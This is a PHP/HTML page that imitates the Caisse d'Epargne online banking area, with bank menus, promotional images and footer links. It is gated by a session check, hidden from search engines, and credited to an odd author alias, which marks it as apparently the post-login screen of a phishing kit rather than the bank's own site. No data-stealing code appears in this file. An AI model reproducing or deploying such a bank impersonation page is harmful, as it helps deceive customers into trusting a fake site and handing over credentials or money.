<?php
if (session_id() == "")
{
   session_start();
}
if (!isset($_SESSION['username']))
{
   header('Location: ./../access_deny.php');
   exit;
}
if (isset($_SESSION['expires_by']))
{
   $expires_by = intval($_SESSION['expires_by']);
   if (time() < $expires_by)
   {
      $_SESSION['expires_by'] = time() + intval($_SESSION['expires_timeout']);
   }
   else
   {
      unset($_SESSION['username']);
      unset($_SESSION['expires_by']);
      unset($_SESSION['expires_timeout']);
      header('Location: ./../access_deny.php');
      exit;
   }
}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Language" content="fr">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Banque et assurance</title>
<meta name="author" content="Pirvate Untherthered">
<meta name="robots" content="NOINDEX, NOFOLLOW">
<link href="Sans.css" rel="stylesheet" type="text/css">
<link href="v=y.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="space"><br></div>
<div id="container">
<div id="wb_Image1" style="position:absolute;left:8px;top:25px;width:260px;height:60px;z-index:0;">
<img src="images/national_logo.png" id="Image1" alt=""></div>
<div id="wb_CssMenu1" style="position:absolute;left:7px;top:85px;width:1020px;height:74px;z-index:1;">
<ul>
<li class="firstmain"><a href="#" target="_self">Ma&nbsp;synth&#232;se</a>
</li>
<li><a href="#" target="_self">Mes&nbsp;comptes</a>
</li>
<li><a href="#" target="_self">Mes&nbsp;cr&#233;dits</a>
</li>
<li><a href="#" target="_self">Mon&nbsp;&#233;pargne</a>
</li>
<li><a href="#" target="_self">Mes&nbsp;assurances</a>
</li>
</ul>
<br>
</div>
<div id="wb_Image2" style="position:absolute;left:846px;top:23px;width:17px;height:17px;z-index:2;">
<img src="images/locked-1.png" id="Image2" alt=""></div>
<div id="wb_Shape1" style="position:absolute;left:6px;top:588px;width:982px;height:203px;filter:alpha(opacity=50);-moz-opacity:0.50;opacity:0.50;z-index:3;">
<img src="images/img0050.png" id="Shape1" alt="" style="width:982px;height:203px;"></div>
<div id="wb_Image3" style="position:absolute;left:13px;top:603px;width:232px;height:164px;z-index:4;">
<img src="images/allocation-pilotee-equilibre_push_marketing.gif" id="Image3" alt=""></div>
<div id="wb_Image4" style="position:absolute;left:255px;top:603px;width:232px;height:164px;z-index:5;">
<img src="images/livrets-a-connecter_push_marketing.gif" id="Image4" alt=""></div>
<div id="wb_Image5" style="position:absolute;left:498px;top:603px;width:232px;height:164px;z-index:6;">
<img src="images/diversifiez-vos-placements-dans-l-immobilier_push_marketing.gif" id="Image5" alt=""></div>
<div id="wb_Image6" style="position:absolute;left:745px;top:603px;width:232px;height:164px;z-index:7;">
<img src="images/preuve-coloc_push_marketing.gif" id="Image6" alt=""></div>
<div id="wb_Image7" style="position:absolute;left:23px;top:826px;width:257px;height:269px;z-index:8;">
<img src="images/search-france-big.png" id="Image7" alt=""></div>
<div id="wb_Text1" style="position:absolute;left:374px;top:912px;width:591px;height:23px;z-index:9;text-align:left;">
<span style="color:#CF002A;font-family:Arial;font-size:20px;">Rendez-vous sur le site de la Caisse d'Epargne de votre région</span></div>
<div id="wb_Text2" style="position:absolute;left:375px;top:946px;width:552px;height:48px;z-index:10;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Afin de proposer des solutions adaptées aux besoins de chacun, la Caisse d'Epargne s'appuie sur les conseils personnalisés de son réseau d'experts, répartis dans ses 17 Caisses régionales.</span></div>
<div id="wb_Shape3" style="position:absolute;left:7px;top:1105px;width:970px;height:3px;filter:alpha(opacity=50);-moz-opacity:0.50;opacity:0.50;z-index:11;">
<img src="images/img0051.png" id="Shape3" alt="" style="width:970px;height:3px;"></div>
<div id="wb_Text3" style="position:absolute;left:7px;top:1119px;width:248px;height:192px;z-index:12;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>BANQUE AU QUOTIDIEN</strong></span><span style="color:#696969;font-family:Arial;font-size:13px;"><strong><br><br></strong></span><span style="color:#808080;font-family:Arial;font-size:13px;"><strong>Ouvrir un compte bancaire<br>Gérer ses comptes<br>Carte Bancaire<br>Carte Bancaire Rechargeable<br>Transmission - Successions<br>Comprendre les frais bancaires<br>Garantie des dépôts<br>Comptes inactifs et déshérence<br>Echange d’informations fiscales<br>Tarifs et informations réglementaires</strong></span></div>
<div id="wb_Text4" style="position:absolute;left:280px;top:1119px;width:250px;height:144px;z-index:13;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>AIDE ET OUTILS PRATIQUES<br><br></strong></span><span style="color:#808080;font-family:Arial;font-size:13px;"><strong>Contacts - numéros utiles<br>Assistance perte et vol / Opposition<br>Focus - «&nbsp;Tout savoir sur…&nbsp;»<br>Guides Pratiques<br>FAQ<br>Mentions légales<br>Sécurité</strong></span></div>
<div id="wb_Text5" style="position:absolute;left:530px;top:1119px;width:250px;height:176px;z-index:14;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>PROFESSIONNELS<br><br></strong></span><span style="color:#808080;font-family:Arial;font-size:13px;"><strong>Outils et services pros<br>Compte professionnel<br>Prévenir le risque de fraude<br>Entreprises<br>Associations / Economie sociale<br>Secteur Public<br>Logement Social<br>Immobilier Professionnel<br>E-remises</strong></span></div>
<div id="wb_Text6" style="position:absolute;left:762px;top:1119px;width:250px;height:160px;z-index:15;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>LA CAISSE D’EPARGNE ET VOUS<br></strong><br></span><span style="color:#696969;font-family:Arial;font-size:13px;">Nous connaitre<br>Fédération Nationale (FNCE)<br>Sponsoring - Mécénat<br>Recrutement<br>Site Sociétaires<br>Décideurs en Région<br>Horizon Entrepreneurs<br>Changer de Caisse</span></div>
<div id="wb_Image8" style="position:absolute;left:789px;top:1063px;width:32px;height:32px;z-index:16;">
<a href="#"><img src="images/facebook.png" id="Image8" alt=""></a></div>
<div id="wb_Image9" style="position:absolute;left:831px;top:1063px;width:32px;height:32px;z-index:17;">
<a href="#"><img src="images/twitter.png" id="Image9" alt=""></a></div>
<div id="wb_Image10" style="position:absolute;left:874px;top:1063px;width:32px;height:32px;z-index:18;">
<a href="#"><img src="images/instagram.png" id="Image10" alt=""></a></div>
<div id="wb_Text7" style="position:absolute;left:12px;top:139px;width:256px;height:16px;z-index:19;text-align:left;">
<span style="color:#CF002A;font-family:Arial;font-size:13px;"><strong>Mon espace virement</strong></span></div>

<div id="wb_Text19" style="position:absolute;left:280px;top:49px;width:250px;height:17px;z-index:21;text-align:left;">
<span style="color:#CF002A;font-family:Arial;font-size:15px;">Particuliers&nbsp; </span><span style="color:#000000;font-family:Arial;font-size:15px;">| Professionnels</span></div>
<div id="wb_Shape14" style="position:absolute;left:268px;top:47px;width:92px;height:22px;filter:alpha(opacity=30);-moz-opacity:0.30;opacity:0.30;z-index:22;">
<a href=""><img class="hover" src="images/img0052_hover.gif" alt="" style="border-width:0;width:92px;height:22px;"><span><img src="images/img0052.gif" id="Shape14" alt="" style="width:92px;height:22px;"></span></a></div>
<div id="wb_Shape15" style="position:absolute;left:836px;top:19px;width:152px;height:28px;filter:alpha(opacity=30);-moz-opacity:0.30;opacity:0.30;z-index:23;">
<a href="./../index.html" title="Deconnexion"><img class="hover" src="images/img0053_hover.gif" alt="" style="border-width:0;width:152px;height:28px;"><span><img src="images/img0053.gif" id="Shape15" alt="" style="width:152px;height:28px;"></span></a></div>
<div id="wb_Text20" style="position:absolute;left:874px;top:24px;width:250px;height:16px;z-index:24;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Déconnexion</span></div>
</div>
</body>
</html>